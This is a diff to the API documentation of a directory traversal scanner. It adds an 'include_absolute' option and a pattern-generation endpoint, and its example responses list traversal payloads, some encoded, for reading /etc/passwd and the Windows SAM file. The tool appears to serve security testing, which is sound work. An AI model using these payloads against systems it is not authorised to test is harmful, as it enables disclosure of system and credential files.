@@ -242,7 +242,8 @@ Create and optionally start a new directory traversal scan.
     "pattern": "root:",
     "depth": 8,
     "delay": 0.3,
-    "os_type": "unix"
+    "os_type": "unix",
+    "include_absolute": true
   },
   "options": {
     "ssl": false,
@@ -287,7 +288,8 @@ curl -X POST "http://localhost:8000/scans" \
     "config": {
       "file": "/etc/passwd",
       "pattern": "root:",
-      "depth": 8
+      "depth": 8,
+      "include_absolute": true
     },
     "options": {
       "ssl": false,
@@ -374,7 +376,8 @@ curl "http://localhost:8000/scans/scan_2025092810300001" \
     "file": "/etc/passwd",
     "pattern": "root:",
     "depth": 8,
-    "delay": 0.3
+    "delay": 0.3,
+    "include_absolute": true
   },
   "status": "completed",
   "progress": {
@@ -489,6 +492,157 @@ curl -X DELETE "http://localhost:8000/scans/scan_2025092810300001" \
   "status": "deleted",
   "deleted_at": "2025-09-28T10:45:00Z",
   "message": "Scan and all data deleted successfully"
+}
+```
+
+## 🆕 Pattern Generation API
+
+### Generate Traversal Patterns
+
+```http
+POST /generate
+```
+
+**NEW FEATURE**: Generate directory traversal patterns without performing scans. Perfect for testing, integration, and custom payload creation.
+
+#### Request Body
+
+```json
+{
+  "os_type": "unix",
+  "file": "/etc/passwd",
+  "depth": 6,
+  "include_absolute": true,
+  "quiet": false
+}
+```
+
+#### Parameters
+
+| Parameter | Type | Default | Description |
+|-----------|------|---------|-------------|
+| `os_type` | string | `"unix"` | Target OS type (`unix`, `windows`, `generic`) |
+| `file` | string | `"/etc/passwd"` | Target file to generate patterns for |
+| `depth` | integer | `6` | Maximum traversal depth (1-50) |
+| `include_absolute` | boolean | `false` | Include absolute path patterns |
+| `quiet` | boolean | `false` | Suppress progress messages |
+
+#### Example Request
+
+```bash
+# Generate UNIX patterns with absolute paths
+curl -X POST "http://localhost:8000/generate" \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: ddp_1234567890abcdef" \
+  -d '{
+    "os_type": "unix",
+    "file": "/etc/passwd",
+    "depth": 5,
+    "include_absolute": true
+  }'
+
+# Response:
+{
+  "status": "success",
+  "config": {
+    "os_type": "unix",
+    "file": "/etc/passwd",
+    "depth": 5,
+    "include_absolute": true
+  },
+  "statistics": {
+    "total_patterns": 1922,
+    "relative_patterns": 1778,
+    "absolute_patterns": 144,
+    "generation_time": 0.312
+  },
+  "patterns": [
+    "../etc/passwd",
+    "../../etc/passwd",
+    "../../../etc/passwd",
+    "../../../../etc/passwd",
+    "../../../../../etc/passwd",
+    "/etc/passwd",
+    "%2fetc%2fpasswd",
+    "%2Fetc%2Fpasswd",
+    "\\etc\\passwd",
+    "%5cetc%5cpasswd",
+    "...additional 1917 patterns..."
+  ]
+}
+```
+
+#### Windows Example
+
+```bash
+# Generate Windows patterns
+curl -X POST "http://localhost:8000/generate" \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: ddp_1234567890abcdef" \
+  -d '{
+    "os_type": "windows",
+    "file": "c:\\\\windows\\\\system32\\\\config\\\\sam",
+    "depth": 4,
+    "include_absolute": true
+  }'
+
+# Response:
+{
+  "status": "success",
+  "config": {
+    "os_type": "windows",
+    "file": "c:\\windows\\system32\\config\\sam",
+    "depth": 4,
+    "include_absolute": true
+  },
+  "statistics": {
+    "total_patterns": 1234,
+    "relative_patterns": 1122,
+    "absolute_patterns": 112,
+    "generation_time": 0.256
+  },
+  "patterns": [
+    "../c:/windows/system32/config/sam",
+    "../../c:/windows/system32/config/sam",
+    "../../../c:/windows/system32/config/sam",
+    "../../../../c:/windows/system32/config/sam",
+    "c:\\windows\\system32\\config\\sam",
+    "%2fc%5cwindows%5csystem32%5cconfig%5csam",
+    "...additional 1228 patterns..."
+  ]
+}
+```
+
+### Get Pattern Statistics
+
+```http
+GET /generate/stats
+```
+
+Get statistics about pattern generation capabilities.
+
+```bash
+curl "http://localhost:8000/generate/stats" \
+  -H "X-API-Key: ddp_1234567890abcdef"
+
+# Response:
+{
+  "supported_os_types": ["unix", "windows", "generic"],
+  "target_files": {
+    "unix": 36,
+    "windows": 27,
+    "generic": 15
+  },
+  "pattern_types": {
+    "relative_patterns": 24,
+    "absolute_patterns": 144,
+    "encoding_variations": 20
+  },
+  "performance": {
+    "average_generation_time": 0.287,
+    "patterns_per_second": 6734,
+    "max_recommended_depth": 15
+  }
 }
 ```
 
